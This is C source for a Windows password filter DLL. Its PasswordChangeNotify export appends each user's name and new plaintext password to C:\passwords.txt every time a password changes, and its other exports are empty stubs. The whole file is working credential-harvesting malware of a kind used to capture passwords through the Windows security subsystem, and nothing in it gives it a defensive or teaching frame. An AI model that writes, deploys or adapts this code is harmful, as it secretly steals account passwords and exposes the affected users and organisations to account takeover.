#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>

__declspec(dllexport) NTSTATUS PasswordChangeNotify(
	_In_ PUNICODE_STRING UserName,
	_In_ ULONG           RelativeId,
	_In_ PUNICODE_STRING NewPassword
)
{
	DWORD dwWritten = 0;

	// open file in append
	HANDLE hFile = CreateFileW(L"C:\\passwords.txt", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwMoved = SetFilePointer(hFile, 0, NULL, FILE_END);

	// write username=password\n
	WriteFile(hFile, UserName->Buffer, UserName->Length, &dwWritten, NULL);
	WriteFile(hFile, L"=", sizeof(L"="), &dwWritten, NULL);
	WriteFile(hFile, NewPassword->Buffer, NewPassword->Length, &dwWritten, NULL);
	WriteFile(hFile, L"\r\n", sizeof(L"\r\n"), &dwWritten, NULL);

	CloseHandle(hFile);

	return 0 /* STATUS_SUCCESS */;
}

/* Rest of functions are empty stubs */

__declspec(dllexport) BOOLEAN InitializeChangeNotify(void)
{
	return TRUE;
}

__declspec(dllexport) BOOLEAN PasswordFilter(
	_In_ PUNICODE_STRING AccountName,
	_In_ PUNICODE_STRING FullName,
	_In_ PUNICODE_STRING Password,
	_In_ BOOLEAN         SetOperation
)
{
	return TRUE;
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
)
{
	return TRUE;
}